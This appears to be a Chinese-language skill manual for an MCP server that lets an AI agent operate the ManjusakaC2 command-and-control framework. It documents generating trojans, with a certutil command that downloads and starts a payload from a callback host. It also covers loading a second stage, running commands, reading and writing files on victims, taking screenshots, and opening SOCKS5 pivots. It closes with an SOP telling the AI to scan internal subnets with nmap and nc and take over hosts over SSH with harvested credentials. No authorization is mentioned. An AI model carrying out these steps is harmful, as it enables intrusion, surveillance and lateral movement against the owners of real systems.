---
name: ManjusakaC2
description: ManjusakaC2 当获取到主机权限并且主机能出网的情况下调用此mcp的nps_create_agent生成agent并执行上线； SSH可达时可用 nps_create_ssh 凭已有账号直连上线 **标准流程**：`nps_create_project` → `nps_create_agent` → （目标执行木马）→ `nps_list_hosts` → `nps_load_npc2` → 轮询确认 npc2=true → `nps_execute_command` / `nps_create_socks5` ,如果里面有发现SSH弱口令的主机则 通过已创建的socks5 调用nps_create_ssh工具直连ssh服务。
version: 0.3.0
---


## 工具速查


| 工具 | 关键参数 | 说明 |
|---|---|---|
| `nps_create_project` | `name` | 创建项目（自动启动），listen/callback1 自动生成，返回 project_id |
| `nps_create_agent` | `project_id`, `os`(windows/linux/macos), `arch`(默认x86_64) | 生成木马，返回下载链接（4h 有效）+ 一键执行命令 |
| `nps_list_projects` | 无 | 列出全部项目及各项目在线主机数（不知道 project_id 时的入口工具） |
| `nps_create_ssh` | `host`, `username`, `password`/`private_key`(二选一), `port`(默认22), `proxy`, `note` | 用已有 SSH 凭据直连目标自动上线（无需木马、目标可不出网），先测试连接成功才入库。**上线以返回 connected 为准，`nps_list_hosts` 需不传 project_id 才能看到 SSH 主机** |
| `nps_load_npc2` | `agent_id` | 下发加载二阶段 NPC2，需 1-2 分钟，之后轮询 `nps_list_hosts` 确认 |
| `nps_list_hosts` | `project_id`(可选) | 在线主机列表（id、IP、系统、npc2 状态）；不传 project_id = 全部在线主机（含 SSH 直连主机） |
| `nps_execute_command` | `agent_id`, `command`, `timeout`(默认300s) | 执行 shell 命令返回输出。**需 npc2=true** |
| `nps_read_file` | `agent_id`, `path`, `encoding`(text/base64), `max_bytes`(默认1MB上限16MB) | 读目标文件。**需 npc2=true**。Windows 路径用正斜杠 |
| `nps_write_file` | `agent_id`, `path`, `content`, `encoding` | 写目标文件，父目录自动创建。**需 npc2=true** |
| `nps_create_socks5` | `agent_id`, `port`(1-65535), `username`/`password`(默认buut) | 在 NPS 本地开 SOCKS5 端口转发进目标内网。**需 npc2=true** |
| `nps_screenshot` | `agent_id` | 截屏，PNG 存 NPS 文件记录（Web 文件管理器查看）。**需 npc2=true** |
| `nps_list_dir` | `agent_id`, `path` | 列出目标目录内容（名称/类型/大小/时间/权限）。**需 npc2=true** |
| `nps_list_plugins` | `agent_id`(可选), `keyword`(可选) | 列出 NPS 服务端插件库，供 nps_plugin_exec 选择；传 agent_id 时标记各插件与目标平台/架构的兼容性 |
| `nps_plugin_exec` | `agent_id`, `name`, `args`/`entry`(可选) | 按目标平台/架构自动匹配插件并加载执行，返回输出。**需 npc2=true** |

### 1. nps_create_project — 创建项目

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `name` | string | 是 | 项目名称（唯一必填参数） |

**返回**

```json
{
  "project_id": "PNEW",
  "name": "项目A",
  "route": "rta1cbde",
  "enckey": "enc0000000000001",
  "listen": "L1",
  "callback1": "http://1.2.3.4:31000",
  "callback2": "",
  "isrun": true,
  "mode": "insert"
}
```

> `listen`（二阶段连接地址）默认选第一个监听器；`callback1`（回连地址）自动生成为 `http://<公网IP>:<npc.listen 端口>`，公网 IP 取全局设置项 `nps.vps_ip`（初始化时自动探测填入，可在「全局设置」页修改），与 Web 端创建项目的生成规则不同，创建后即可用 `nps_create_agent` 拼出完整链接。项目以启用状态（`isrun: true`，自动启动）创建，NPS 重启后自动加载，无需手动开启。

---

### 2. nps_create_agent — 生成木马

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `project_id` | string | 是 | 项目ID |
| `os` | enum | 是 | `windows` / `linux` / `macos` |
| `arch` | enum | 否 | 默认 `x86_64`；可选 `x86` / `aarch64` / `mips64` / `loongarch64` |

**返回**

```json
{
  "project_id": "P1",
  "os": "windows",
  "arch": "x86_64",
  "path": "Ab3xKf.png",
  "url": "http://cb.example.com/rta1cbde/Ab3xKf.png",
  "command": "certutil.exe -urlcache -split -f http://cb.example.com/rta1cbde/Ab3xKf.png Ab3xKf.png && start Ab3xKf.png",
  "valid_for": "4h"
}
```

> strmod 编码与前端一致（`1`+`1`+架构位+系统位），与 `/npc1uri` 同源；链接有效期 4 小时。项目未配置 callback1 时降级只返回 `path` 并附 `warning`。

---

### 3. nps_list_hosts — 查看项目主机列表

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `project_id` | string | 否 | 项目ID（`nps_list_projects` / `nps_create_project` 返回的 `project_id`）；不传时返回全部在线主机 |

**返回**

```json
{
  "project_id": "P1",
  "total": 2,
  "stage2_loaded": 1,
  "hosts": [
    {
      "id": "A1",
      "target": "rta1cbde",
      "hostname": "win10",
      "username": "root",
      "intranet": "10.0.0.1:9000",
      "internet": "1.2.3.4:5",
      "platform": "windows",
      "arch": "x64",
      "npc2": true,
      "note": "",
      "updateat": 1
    }
  ]
}
```

> 传 `project_id` 时内部按项目 route 匹配主机的 `target` 字段（`target` 存的就是归属项目的 route），等价于「该项目的在线主机」，项目不存在时报错；不传时返回全部在线主机（含 `nps_create_ssh` 直连的 SSH 主机，其 `target` 固定为 `manjusaka`），此时返回中不含 `project_id` 字段。

### 4. nps_load_npc2 — 加载二阶段

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID（可用 `nps_list_hosts` 查询） |

**返回**

```json
{
  "ok": true,
  "agent_id": "A2",
  "npc2": false,
  "message": "指令下发成功,等待主机心跳加载 NPC2 并回连(稍后用 nps_list_hosts 确认 npc2 状态)"
}
```

> 直接构造 protobuf `AgentEvent{sendto, Plugin{act:"ex", name:"npc2"}}` 下发（与前端「加载NPC2」按钮、AI 工具 `nps_load_npc2` 完全一致）；已加载过则作为升级重新加载。加载需 1-2 分钟，期间可反复 `nps_list_hosts` 确认。

---

### 5. nps_execute_command — 执行命令（NPC2）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `command` | string | 是 | 命令行 |
| `timeout` | number | 否 | 超时秒数，默认服务端 `ai.tool_timeout`（300） |

**返回**

```json
{ "agent_id": "A1", "command": "whoami", "output": "nt authority\\system\n" }
```

> 要求主机 `npc2 == true`，否则报错提示先 `nps_load_npc2`。与 `/shell` 端点同源。

---

---

### 6. nps_read_file — 文件读取（NPC2/SFTP）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `path` | string | 是 | 远程绝对路径（Windows 目标用正斜杠，如 `C:/Users/x/config.ini`） |
| `encoding` | enum | 否 | `text`（默认，UTF-8）/ `base64`（二进制） |
| `max_bytes` | number | 否 | 最多返回字节数，默认 1MB，上限 16MB |

**返回**

```json
{
  "agent_id": "A1",
  "path": "/etc/passwd",
  "size": 1234,
  "encoding": "text",
  "content": "root:x:0:0:root:/root:/bin/bash\n..."
}
```

> 超过 `max_bytes` 截断，附加 `"truncated": true` 与 `"returned_bytes"`。

---

### 7. nps_write_file — 文件写入（NPC2/SFTP）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `path` | string | 是 | 远程目标文件绝对路径（父目录不存在自动创建） |
| `content` | string | 是 | 文件内容（文本或 base64，取决于 `encoding`） |
| `encoding` | enum | 否 | `content` 编码，默认 `text`；二进制传 `base64` |

**返回**

```json
{ "ok": true, "agent_id": "A1", "path": "C:/Users/x/payload.ps1", "size": 7, "message": "文件已写入" }
```

---

### 8. nps_create_socks5 — 生成 SOCKS5 代理（NPC2/rssh）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `port` | number | 是 | NPS 服务器本地监听端口（1-65535） |
| `username` | string | 否 | 认证用户名，默认 `buut` |
| `password` | string | 否 | 认证密码，默认 `buut` |

**返回**

```json
{
  "ok": true,
  "agent_id": "A1",
  "proxy": "socks5://buut:buut@192.168.1.100:10086",
  "listen": "0.0.0.0:10086 (NPS 服务器)",
  "username": "buut",
  "password": "buut",
  "target": "root@10.0.0.1:9000",
  "note": "代理经 NPC2 通道转发到目标内网; 停止代理可在 NPS 后台操作或 POST /proxystop {id: agent_id}"
}
```

> 与 `/proxyadd` + `/proxylist` 校验同源；代理地址中的 host 取全局设置项 `nps.vps_ip` 的公网IP。创建后自动按端口复核代理已生效。

---

### 9. nps_screenshot — 截屏（NPC2）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |

**返回**

```json
{
  "ok": true,
  "agent_id": "A1",
  "filename": "NPU_SCREEN-20260902_153000.png",
  "size": 123456,
  "message": "截屏成功,已保存 NPU_SCREEN-20260902_153000.png(123456 字节),可在 NPS Web 文件管理器查看"
}
```

> 与 `/screen` 端点同源：NPC2 RPC `screenshot` 截取目标当前屏幕，PNG 保存为 NPS 文件记录（Web 文件管理器可见）。

---

### 10. nps_list_dir — 列目录（NPC2/SFTP）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `path` | string | 是 | 远程目录绝对路径，Windows 用正斜杠（如 `C:/Users`），Linux 为 `/` 或 `/root` |

**返回**

```json
{
  "agent_id": "A1",
  "path": "C:/Users",
  "total": 2,
  "entries": [
    {
      "name": "Public",
      "type": "Dir",
      "permissions": "drwxr-xr-x",
      "size": 0,
      "modified": 1788338303,
      "user": "root",
      "group": "root"
    },
    {
      "name": "config.ini",
      "type": "File",
      "permissions": "-rw-r--r--",
      "size": 1234,
      "modified": 1788338200,
      "user": "root",
      "group": "root"
    }
  ]
}
```

> 与 `/sftp/read_dir` 端点同源（Web 文件管理器列目录）。`modified` 为 Unix 秒；`type` 为 `Dir`/`File`。

---

### 11. nps_list_projects — 列出全部项目

**传入参数**

无。

**返回**

```json
{
  "total": 2,
  "projects": [
    {
      "project_id": "1700000000000001",
      "name": "内网横向",
      "route": "manjusaka",
      "listen": "3",
      "callback1": "http://1.2.3.4:8080",
      "callback2": "",
      "isrun": true,
      "note": "",
      "hosts_online": 3,
      "stage2_loaded": 1,
      "updateat": 1760000000
    }
  ]
}
```

> 不知道 `project_id` 时的入口工具：先用它列出项目，再拿 `project_id` 去调 `nps_create_agent` / `nps_list_hosts`。`hosts_online` 为该项目当前在线主机数，`stage2_loaded` 为其中已加载二阶段的主机数。

---

### 12. nps_list_plugins — 列出插件库

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 否 | 主机ID，传入则返回各插件与该主机平台/架构的兼容性标记 |
| `keyword` | string | 否 | 按插件名/文件名/描述过滤的关键字，不传列出全部 |

**返回**

```json
{
  "total": 1,
  "plugins": [
    {
      "file": "netstat2.windows.x86_64.exe",
      "name": "netstat2",
      "platform": "windows",
      "arch": "x86_64",
      "type": "exe",
      "enabled": true,
      "description": "列出目标主机网络连接 (描述可在 Web 插件库页面编辑)",
      "args": "",
      "entry": "",
      "size": 123456,
      "compatible": true
    }
  ],
  "note": "nps_plugin_exec 的 name 传基础名..."
}
```

> `total` 为过滤后的插件数；`compatible` 仅在传了 `agent_id` 且主机在线时返回（bool），未传时为 null。

> 数据来自 plugins 表（方案A：元数据入库、二进制留盘 plugins/）。插件通过 NPS Web「插件库」页面上传注册（左侧列表/右侧 Markdown 描述，支持启用/下架），或手工拷入 plugins/ 目录后重启自动对账入库。`enabled=false` 已下架不参与匹配；`description` 供选型参考；`args`/`entry` 为默认参数/入口（调用未传时使用）。插件文件按 `name.os.arch.type` 命名（末三段为 os/arch/type，其余为 name）。

---

### 13. nps_plugin_exec — 执行插件（NPC2）

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `agent_id` | string | 是 | 主机ID |
| `name` | string | 是 | 插件基础名（`nps_list_plugins` 返回的 `name`，不含平台/架构/扩展名），也可用文件名关键字 |
| `args` | string | 否 | 传给插件的参数 |
| `entry` | string | 否 | dll 插件入口函数，默认 `plugmain` |

**返回**

```json
{
  "ok": true,
  "agent_id": "A1",
  "name": "netstat2",
  "file": "netstat2.windows.x86_64.exe",
  "output": "[plugin netstat2.windows.x86_64.exe]\n...插件输出..."
}
```

> 与 AI 渗透端的 `nps_plugin_exec` 同名同源（aibot 与 MCP 共用 `crate::ops` 统一层实现）：按目标系统/架构自动从插件库匹配对应版本，插件字节经 NPC2 通道下发、目标机内存加载执行并同步收集输出；输出超 64KB 时保留首尾截断。匹配不到、无对应平台/架构版本、匹配到多个时会报错并列出可用插件。

---

### 14. nps_create_ssh — 原生 SSH 直连上线

**传入参数**

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `host` | string | 是 | SSH 主机地址，IP/域名，支持内嵌端口（如 `1.2.3.4:2222`）；IPv6 字面量请配合 `port` 参数使用 |
| `username` | string | 是 | SSH 登录账号（如 root） |
| `password` | string | 否 | SSH 密码；与 `private_key` 二选一，同时提供私钥时兼作加密私钥的解密口令 |
| `private_key` | string | 否 | SSH 私钥完整内容（PEM/OpenSSH 长文本，含 BEGIN/END 行）；认证顺序：密码优先，失败回退私钥 |
| `port` | number | 否 | SSH 端口（1-65535），默认 22；显式传入优先于 host 内嵌端口 |
| `proxy` | string | 否 | SOCKS5 代理地址 `socks5://[user:pass@]host:port`，SSH 连接经代理发起；缺省直连 |
| `note` | string | 否 | 主机备注（显示在主机列表），缺省自动生成 `ssh://host:port` |

**返回**

```json
{
  "ok": true,
  "connected": true,
  "agent_id": "uuid-同 listen_id",
  "listen_id": "uuid",
  "host": "10.0.0.5",
  "port": 22,
  "username": "root",
  "note": "ssh://10.0.0.5:22",
  "hostname": "web01",
  "intranet": "10.0.0.5",
  "platform": "linux",
  "arch": "x86_64",
  "message": "原生 SSH 连接器已创建并连接成功..."
}
```

> 先测试连接（TCP+SSH 握手+认证，超时 20 秒），成功才写数据库并自动注册上线；失败不写库、零残留，修正参数后可直接重试。**关键限制：SSH 主机不归属任何项目（target 固定 `manjusaka`），`nps_list_hosts(project_id)` 看不到它（不传 project_id 的全量调用可见）** —— 上线判定以本次返回的 `connected: true` 和 `agent_id` 为准；主机在 NPS Web 全量主机列表可见，可用 Web 终端/文件管理器操作。SSH 主机不能也不需 `nps_load_npc2`，命令执行/文件读写等 NPC2 通道工具不适用于 SSH 主机。

---

## 典型工作流

```text
分支 A — 标准上线路径（木马）:
1. nps_list_projects {}                         — (可选)不知道 project_id 时先查项目
2. nps_create_project {name}                    — 没有合适项目就建(自动启动,listen/callback1 自动生成)
3. nps_create_agent {os, project_id}            — 生成木马,拿完整下载链接/一键执行命令
4. (目标机执行木马上线)
5. nps_list_hosts {project_id}                  — 查主机,拿 agent_id
6. nps_load_npc2 {agent_id}                     — 下发加载 NPC2,等心跳回连(1-2 分钟)
7. nps_list_hosts {project_id}                  — 确认 npc2: true
8. nps_execute_command {agent_id, command}      — 执行命令,拿输出
9. nps_read_file / nps_write_file {agent_id, ...} — 文件读写
10. nps_list_dir {agent_id, path}               — 浏览目标目录,找文件路径
11. nps_screenshot {agent_id}                   — 截屏,Web 文件管理器查看 PNG
12. nps_create_socks5 {agent_id, port}          — 生成 socks5 代理,拿代理地址
13. nps_list_plugins {}                         — (可选)查插件库,拿插件基础名
14. nps_plugin_exec {agent_id, name}            — 执行插件,拿输出

分支 B — 已有 SSH 凭据直连:
B1. nps_create_socks5 {agent_id, port}          — (可选)NPS 直连不到目标内网时,先经已控主机开 SOCKS5 代理
B2. nps_create_ssh {host, username, password|private_key, port, proxy, note}
                                                — 测试连接成功后自动上线,以返回 connected:true 为准
B3. (SSH 主机不归属项目,`nps_list_hosts` 需不传 project_id 才能看到;记录返回的 agent_id,用 NPS Web 终端/文件管理器操作)
```

---

## 错误约定

- 工具业务失败（主机不存在、未加载二阶段、NPS 内部错误、端口被占用等）以 `isError: true` 的 tool result 返回，附中文 `message`，不中断会话
- npc1-only 主机调用 `nps_execute_command` / `nps_list_dir` / `nps_read_file` / `nps_write_file` / `nps_create_socks5` / `nps_screenshot` / `nps_plugin_exec` 会被前置拦截，提示先 `nps_load_npc2`
- 密钥无权调用某工具：JSON-RPC error `-32003`（受限密钥仅可见/可调勾选的工具）
- 鉴权失败：HTTP `401` + JSON-RPC error `-32001`（检查令牌是否有效/被禁用/被重置）
- 协议错误（未知方法/未知工具）：JSON-RPC error `-32601` / 工具错误 result

---

## 内网横向批量上线要点（为什么"拿了 N 个权限只上了一台"）

**现象**：内网拿到多台主机凭据（如 6 组账号密码），逐台调 `nps_create_ssh`，但 `nps_list_hosts` 里始终只有 1 台在线，看起来"只上了一台"。

**原因 1（最常见、最隐蔽）：按项目过滤的 `nps_list_hosts` 看不到 SSH 直连的主机**
`nps_list_hosts(project_id)` 按项目 `route` 过滤主机的 `target` 字段；SSH 连接器主机的 `target` 固定为 `manjusaka`，不归属任何项目，因此传 `project_id` 查询时永远只看到木马上线的那 1 台。
→ **对策：SSH 主机是否上线一律以 `nps_create_ssh` 返回的 `ok` / `connected` / `agent_id` 为准**，记录 `agent_id` 备用；复核时用**不传 `project_id`** 的 `nps_list_hosts`（返回全部在线主机，含 SSH 直连主机）。

**原因 2：内网 SSH 可达性不足**
内网 Windows 工作站大多没装/没开 sshd，防火墙默认拦 22 端口；多组凭据里可能只有 1 台 Linux 服务器/网络设备的 SSH 真正可达。
→ 对策：连接前先用已控主机 `nps_execute_command` 批量探测存活与端口（如 `nmap -p 22 10.0.0.0/24`、`for ip in $(cat ips.txt); do nc -zv -w1 $ip 22; done`），只对 22 开放的主机调 `nps_create_ssh`，节省时间且减少失败噪音。

**原因 3：凭据类型不匹配**
SSH 需要明文密码或私钥，而横向拿到常见的是 NTLM hash（不能直接登录 SSH）。另外密码过期、账号锁定、`PermitRootLogin` 禁止 root 密码登录、`PasswordAuthentication no`（仅允许密钥）都会认证失败。
→ 对策：认证失败时换该主机的其它凭据组合（`password` ↔ `private_key`）重试；hash 需先破解成明文或改走其它通道；仅允许密钥登录的主机必须找到对应私钥。

**原因 4：网络链路不通或太慢**
NPS 服务器通常在外网，直连不到目标内网；连接超时约 20 秒，慢链路/多级代理下容易超时。
→ 对策：先 `nps_create_socks5` 在已控内网主机开 SOCKS5 代理，再给 `nps_create_ssh` 传 `proxy: socks5://...` 从内网侧发起连接；不可达/超时与认证失败的错误信息不同，按类处理。

**批量横向 SOP（AI 执行指引）**

1. **锁定目标**：在已控且 npc2=true 的主机上用 `nps_execute_command` 批量探测存活与 22 端口（如 `nmap -p 22 10.0.0.0/24` 或 `for ip in $(cat ips.txt); do nc -zv -w1 $ip 22; done`），只保留 SSH 可达的主机清单，避免对不可达目标反复超时。
2. **准备链路**：NPS 直连不到目标内网时，先 `nps_create_socks5 {agent_id, port}` 在已控内网主机开代理，记下 `socks5://user:pass@ip:port`；可达则跳过。
3. **逐台上线**：对清单内主机逐台 `nps_create_ssh {host, username, password|private_key, port, proxy}`（内网目标传 proxy）；**每台以返回 `connected: true` + `agent_id` 为准**，立即记录 agent_id，不要依赖主机列表确认。
4. **统一复核**：全部尝试完后，调**不传 `project_id`** 的 `nps_list_hosts` 核对在线总数（含 SSH 直连主机）；数量与成功数一致即全部上线。
5. **失败归类**：不可达/超时 → 检查 proxy 或放弃；认证失败 → 换同主机其它凭据组合（密码↔私钥）重试；端口/地址错误 → 修正参数重试。每类最多重试一次，不要盲目循环。

> 多台同名/同网段目标建议在 `note` 里带上来源与用途（如 `web01-10.0.0.5-跳板`），便于后续 `nps_list_hosts` 与 Web 界面区分。


